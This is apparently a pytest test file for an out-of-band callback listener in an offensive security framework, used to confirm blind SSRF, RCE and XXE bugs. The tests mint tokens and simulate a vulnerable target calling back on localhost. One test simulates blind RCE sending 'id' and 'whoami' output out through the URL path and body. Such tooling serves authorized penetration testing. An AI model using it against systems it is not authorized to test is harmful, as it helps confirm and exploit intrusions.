"""OastListener: self-hosted out-of-band callback catcher. A unique token pings back only
when the target genuinely reached our listener, confirming a blind (SSRF/RCE/XXE) bug.
"""

from __future__ import annotations

import httpx
import pytest

from aether.attack.oast import OastListener, _token_from_path


def test_token_parsing_and_minting():
    assert _token_from_path("/abc123/x/y") == "abc123"
    assert _token_from_path("/deadbeef?q=1") == "deadbeef"
    oast = OastListener(pub_host="10.60.1.5")
    t1, t2 = oast.new_token(), oast.new_token()
    assert t1 != t2 and len(t1) >= 8
    url = oast.payload_url(t1)
    assert t1 in url and "10.60.1.5" in url


def test_callback_is_recorded_and_token_isolated():
    oast = OastListener(pub_host="127.0.0.1")
    port = oast.start(listen_host="127.0.0.1", listen_port=0)
    try:
        tok = oast.new_token()
        other = oast.new_token()
        assert oast.has_hit(tok) is False
        # Simulate the vulnerable target calling our minted URL (blind SSRF/RCE callback).
        r = httpx.get(f"http://127.0.0.1:{port}/{tok}/confirm", timeout=5)
        assert r.status_code == 200
        assert oast.has_hit(tok) is True
        hits = oast.poll(tok)
        assert len(hits) == 1 and hits[0]["path"].startswith(f"/{tok}")
        assert hits[0]["src_ip"] in ("127.0.0.1", "::1")
        # A different token has no hit — tokens are isolated.
        assert oast.has_hit(other) is False
        assert oast.poll(other) == []
    finally:
        oast.stop()


def test_exfil_in_path_and_body_is_captured():
    oast = OastListener(pub_host="127.0.0.1")
    port = oast.start(listen_host="127.0.0.1", listen_port=0)
    try:
        tok = oast.new_token()
        # Blind RCE exfiltrating `id` output back through the path and body.
        httpx.post(f"http://127.0.0.1:{port}/{tok}/uid=0(root)",
                   content=b"whoami=root", timeout=5)
        hit = oast.poll(tok)[0]
        assert "uid=0(root)" in hit["path"]
        assert "root" in hit["body"]
        s = oast.stats()
        assert s["total"] >= 1 and s["running"] is True
    finally:
        oast.stop()
    assert oast.running is False
